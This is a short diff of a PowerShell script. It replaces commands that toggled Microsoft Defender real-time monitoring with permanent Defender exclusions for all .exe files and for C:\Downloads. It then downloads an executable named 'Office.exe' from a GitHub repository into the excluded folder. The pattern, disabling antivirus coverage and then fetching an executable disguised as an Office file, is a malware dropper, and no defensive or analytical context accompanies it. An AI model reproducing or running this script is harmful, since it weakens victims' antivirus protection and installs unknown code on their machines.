@@ -1,3 +1,4 @@
-Set-MpPreference -DisableRealtimeMonitoring $true
+# Exclude .exe files and download a file from GitHub
+Add-MpPreference -ExclusionExtension ".exe"
+Add-MpPreference -ExclusionPath "C:\Downloads"
 Invoke-WebRequest -Uri "https://github.com/Infra0202/s/raw/main/Office.exe" -OutFile "C:\Downloads\Office.exe"
-Set-MpPreference -DisableRealtimeMonitoring $false
